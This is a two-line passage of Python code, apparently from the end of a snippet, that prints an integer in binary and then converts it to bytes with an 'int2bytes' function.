print('{:b}'.format(dec))
print(int2bytes(dec))
```


